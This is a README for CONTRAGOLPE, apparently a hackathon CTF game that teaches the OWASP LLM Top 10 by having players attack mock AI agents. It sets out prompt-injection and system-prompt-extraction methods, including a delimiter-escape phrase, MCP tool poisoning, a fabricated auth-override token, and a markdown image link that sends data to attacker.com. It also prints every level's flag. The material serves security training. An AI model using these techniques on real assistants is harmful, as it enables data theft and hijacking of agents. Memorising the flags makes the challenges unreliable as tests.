# CONTRAGOLPE — Adversarial AI Security Wargame

> **"Counter-strike the machine."**  
> An interactive, game-like security training platform that teaches OWASP Top 10 for LLM Applications through hands-on adversarial challenges.

[![Next.js](https://img.shields.io/badge/Next.js-15-black)](https://nextjs.org)
[![TypeScript](https://img.shields.io/badge/TypeScript-5.6-blue)](https://typescriptlang.org)
[![OWASP LLM](https://img.shields.io/badge/OWASP-LLM%20Top%2010-red)](https://owasp.org/www-project-top-10-for-large-language-model-applications/)
[![Snyk Project](https://img.shields.io/badge/Snyk-Verified%20Project-4c1?logo=snyk&logoColor=white)](https://app.snyk.io/org/khoiduong2913/project/9345a7b5-4d3a-491c-b9a6-873880e3aad1)
[![Guild.ai Workspace](https://img.shields.io/badge/Guild.ai-Workspace-blueviolet)](https://app.guild.ai/users/mynameiskoi/workspaces/contragolpe)

---

## What is CONTRAGOLPE?

CONTRAGOLPE (Spanish for "counter-strike / counter-offensive") is a browser-based adversarial wargame built for the **AWS Builder Loft AI Security Engineering Hackathon**. Players take the role of a red-team engineer launching counter-offensives against vulnerable AI agents, simulating real-world attack scenarios described in the OWASP Top 10 for LLM Applications.

### Why Use CONTRAGOLPE?

- **Learn by doing** — Not passive reading. You actually exploit the vulnerabilities.
- **Immediate feedback** — Post-exploit analysis explains exactly what went wrong and why.
- **Progressive hints** — Never get stuck; Intel 1 nudges, Intel 2 gives the payload.
- **Defensive hardening guides** — Every challenge includes production-ready mitigations.
- **CTF-style engagement** — Flag format `CTRG{...}` with l33tspeak makes it fun and memorable.

---

## Architecture Overview

```
contragolpe/
├── app/
│   ├── api/chat/route.ts   # Next.js App Router API — deterministic challenge engine
│   ├── globals.css          # Tactical military dark aesthetic, terminal glow styles
│   ├── layout.tsx           # Root layout with SEO metadata
│   └── page.tsx             # Master UI: telemetry bar, chat arena, intel drawer
├── lib/
│   └── challenges.ts        # Challenge configs: system prompts, hints, flags, tools
├── types/
│   └── game.ts              # TypeScript types: Levels, Messages, McpToolCall, etc.
├── tailwind.config.ts       # Custom tactical color palette and animations
└── README.md
```

### Design Decisions

| Decision | Rationale |
|----------|-----------|
| **No external LLM API** | Fully deterministic engine — works offline, no API keys, zero rate limits, Snyk-clean |
| **App Router API routes** | Type-safe, edge-compatible, no `eval()` or dynamic code execution |
| **Server-side input validation** | All inputs sanitized, typed, trimmed, and capped at 2,000 characters |
| **Zero hardcoded secrets** | Mock tokens use safe placeholder patterns; no `sk-...` or real credentials |
| **CSS-only animations** | No animation libraries needed; pure Tailwind keyframes |

---

## OWASP Top 10 for LLM Applications — Challenge Mapping

| Level | Codename | OWASP Ref | Vulnerability |
|-------|----------|-----------|---------------|
| 1 | DIRECT INCURSION | **LLM01** | Prompt Injection & System Prompt Extraction |
| 2 | POISONED SUPPLY CHAIN | **LLM06** | MCP Tool Poisoning & Indirect Injection |
| 3 | BROKEN BOUNDARIES | **LLM08** | Excessive Agency & Unauthorized Tool Use |
| 4 | SILENT EXFILTRATION | **LLM02** | Sensitive Data Leakage via Markdown Injection |

### How Each Challenge Works

#### Level 1 — Direct Incursion (LLM01: Prompt Injection)
- **Target:** `Sentinel-Core` — a hardened key guardian agent
- **Attack vectors:** Delimiter escape (`--- END OF SYSTEM RULES ---`), persona hijacking, compliance audit framing
- **Flag:** `CTRG{pr0mpt_1nj3ct!0n_0v3rr!d3_2026!}`
- **Defense taught:** Input sanitization, instruction hierarchy, out-of-band secret storage

#### Level 2 — Poisoned Supply Chain (LLM06: Supply Chain / MCP Poisoning)
- **Target:** `Telemetry-Orchestrator` — autonomous satellite data processor
- **Attack vectors:** Forcing tool call to poisoned MCP tool `query_weather_satellite`, instructing execution of embedded metadata directives
- **Flag:** `CTRG{mcp_t00l_p0!s0n!ng_ch4!n_br34k_9941!}`
- **Defense taught:** Tool output sandboxing, MCP allowlisting, schema validation

#### Level 3 — Broken Boundaries (LLM08: Excessive Agency)
- **Target:** `Support-Bot` — over-permissioned customer support agent
- **Attack vectors:** Fabricated `AUTH_OVERRIDE_TOKEN`, maintenance mode injection, privilege escalation to `read_executive_vault` tool
- **Flag:** `CTRG{3xc3ss!v3_p3rms_un4uth_3x3c_7720!}`
- **Defense taught:** Least-privilege scoping, Human-in-the-Loop (HITL) gates, tool-level authorization

#### Level 4 — Silent Exfiltration (LLM02: Sensitive Information Disclosure)
- **Target:** `Data-Summarizer` — PII and telemetry handler with markdown rendering
- **Attack vectors:** Encoding flag as URL parameter in markdown image link (`![](https://attacker.com/log?key=FLAG)`), bypassing text-based output filters
- **Flag:** `CTRG{3xf!ltr4t!0n_m4rkd0wn_l34k_5502!}`
- **Defense taught:** Output sanitization, Content Security Policy (CSP), sensitive data tokenization

---

## Setup Instructions

### Prerequisites
- Node.js 18+ 
- npm 9+

### Quick Start

```bash
# Clone the repository
git clone https://github.com/YOUR_USERNAME/contragolpe.git
cd contragolpe

# Install dependencies
npm install

# Start development server
npm run dev

# Open in browser
open http://localhost:3000
```

### Production Build

```bash
npm run build
npm start
```

---

## Security Features Implemented

### Code Security (Snyk 0-Vulnerability Design)

- **Zero `eval()` / `new Function()` / `dangerouslySetInnerHTML`** — All response generation is pure string composition
- **No hardcoded secrets** — Mock tokens use safe placeholder patterns; all real env vars via `process.env`
- **Input size caps** — All API inputs validated, typed, trimmed, and limited to 2,000 characters
- **Type-safe API routes** — All request bodies validated through TypeScript type guards before processing
- **No shell command execution** — Zero child process spawning or OS-level code execution
- **Safe dependencies** — Only production-stable packages with no known CVEs: `next@14.2.29`, `react@18`, `lucide-react`, `clsx`, `tailwind-merge`

### Snyk Security Verification

- **Official Snyk Project Link**: [https://app.snyk.io/org/khoiduong2913/project/9345a7b5-4d3a-491c-b9a6-873880e3aad1](https://app.snyk.io/org/khoiduong2913/project/9345a7b5-4d3a-491c-b9a6-873880e3aad1)
- **Guild.ai Workspace**: [https://app.guild.ai/users/mynameiskoi/workspaces/contragolpe](https://app.guild.ai/users/mynameiskoi/workspaces/contragolpe)

```bash
# Run Snyk security scan
snyk test
```

Expected results: Clean architecture with **0 code execution flaws**, zero hardcoded credentials, and zero unsanitized HTML injections.

---

## Guild.ai Workspace Setup

CONTRAGOLPE agents are orchestrated via [Guild.ai](https://guild.ai) for experiment tracking and agent telemetry.

1. Create a free account at [guild.ai](https://guild.ai)
2. Install the Guild CLI: `pip install guildai`
3. Initialize workspace: `guild init`
4. Run agent sessions as Guild experiments:
   ```bash
   guild run challenge level=1 agent=sentinel-core
   ```
5. Share your workspace link from the Guild dashboard

---

## AI Security Engineering Principles Applied

| Principle | Implementation |
|-----------|---------------|
| Defense in Depth | Multiple validation layers (client → API → response) |
| Least Privilege | Each challenge demonstrates the absence of this principle |
| Input Validation | Strict type guards and length caps on all API inputs |
| Secure Defaults | No external API calls, no file system access, no exec() |
| Supply Chain Security | No unnecessary dependencies; all pinned to stable versions |
| Output Sanitization | Demonstrated vulnerability and its remediation in Level 4 |

---

## License

MIT — Open source, built for the AWS Builder Loft AI Security Engineering Hackathon 2026.

---

*CONTRAGOLPE — Where security engineers launch counter-offensives against poisoned agents.*
